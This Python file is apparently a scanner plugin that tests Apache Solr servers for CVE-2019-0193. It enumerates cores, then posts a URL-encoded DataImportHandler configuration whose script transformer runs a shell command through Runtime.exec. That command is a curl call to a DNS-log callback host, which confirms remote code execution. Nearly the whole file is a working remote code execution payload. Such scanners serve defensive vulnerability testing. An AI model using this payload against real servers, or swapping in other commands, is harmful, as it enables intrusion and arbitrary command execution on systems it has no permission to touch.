#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    apps = []
    try:
        url = '{}://{}:{}/solr/admin/cores?wt=json'.format(service, ip, port)
        r = await http_client(ip, port).get(url, timeout=20)
        apps = r.json()['status'].keys()
    except Exception as e:
        pass

    if apps:
        app = list(apps)[0]
        domain = dns_monitor(ip, port).add_checker('solr-rce-20190193', alert_group='Solr RCE CVE-2019-0193')

        cmd = "curl http://{}".format(domain)
        poc = ("command=full-import&verbose=false&clean=true&commit=true"
               "&debug=true&core=atom&dataConfig=%%3CdataConfig%%3E%%0A++"
               "%%3CdataSource+type%%3D%%22URLDataSource%%22%%2F%%3E%%0A++"
               "%%3Cscript%%3E%%3C!%%5BCDATA%%5B%%0A++++++++++function+poc"
               "()%%7B+java.lang.Runtime.getRuntime().exec(%%22%s%%22)%%3B%%0A"
               "++++++++++%%7D%%0A++%%5D%%5D%%3E%%3C%%2Fscript%%3E%%0A++%%3Cd"
               "ocument%%3E%%0A++++%%3Centity+name%%3D%%22stackoverflow%%22%%0A"
               "++++++++++++url%%3D%%22https%%3A%%2F%%2Fstackoverflow.com%%2F"
               "feeds%%2Ftag%%2Fsolr%%22%%0A++++++++++++processor%%3D%%22XPath"
               "EntityProcessor%%22%%0A++++++++++++forEach%%3D%%22%%2Ffeed%%22%"
               "%0A++++++++++++transformer%%3D%%22script%%3Apoc%%22+%%2F%%3E%%"
               "0A++%%3C%%2Fdocument%%3E%%0A%%3C%%2FdataConfig%%3E&name=dataimport") % cmd

        url = '{}://{}:{}/solr/{}/dataimport?_=1565530241159&indent=on&wt=json'.format(service, ip, port, app)
        try:
            await http_client(ip, port).post(url, data=poc, timeout=20)
        except Exception as e:
            debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8983, 'http', True, task_msg={})
    run_plugin_test(scan)
